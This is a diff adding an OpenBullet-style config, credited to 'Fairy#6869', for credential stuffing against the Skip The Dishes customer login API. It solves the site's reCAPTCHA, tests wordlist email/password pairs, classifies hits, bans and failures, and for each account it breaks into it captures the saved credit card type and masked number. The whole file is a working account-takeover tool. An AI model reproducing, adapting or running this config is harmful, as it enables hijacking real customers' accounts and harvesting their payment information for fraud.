@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Skip The Dishes",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-31T05:30:45.2237922+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://www.skipthedishes.com" "6LchWoEUAAAAAI4TLmE7JsXN5XWIQhmZIfo8T1mj" -> VAR "RECAP" 
+#POST REQUEST POST "https://api-skipthedishes.skipthedishes.com/v1/customers/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"recaptcha\":{\"response\":\"<RECAP>\",\"type\":\"V2_CHECKBOX\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.skipthedishes.com/" 
+  HEADER "App-Token: d7033722-4d2e-4263-9d67-d83854deb0fc" 
+  HEADER "Origin: https://www.skipthedishes.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"id\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "UnauthorizedException" 
+  KEYCHAIN Ban OR 
+    KEY "captcha requested" 
+#ID PARSE "<SOURCE>" JSON "id" Recursive=FALSE -> VAR "ID" "" "" 
+#TOKEN PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "TOK" "" "" 
+#CAPTURE REQUEST GET "https://api-skipthedishes.skipthedishes.com/v1/customers/<ID>/validate-token" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.skipthedishes.com/" 
+  HEADER "User-Token: <TOK>" 
+  HEADER "App-Token: d7033722-4d2e-4263-9d67-d83854deb0fc" 
+  HEADER "Origin: https://www.skipthedishes.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#CREDIT_CARD PARSE "<SOURCE>" JSON "cardType" Recursive=FALSE -> CAP "Card Type" "" "" 
+#ENDING_WITH PARSE "<SOURCE>" LR "maskedNumber\":\"" "\"" Recursive=FALSE -> CAP "Ending Witth" "" "" 
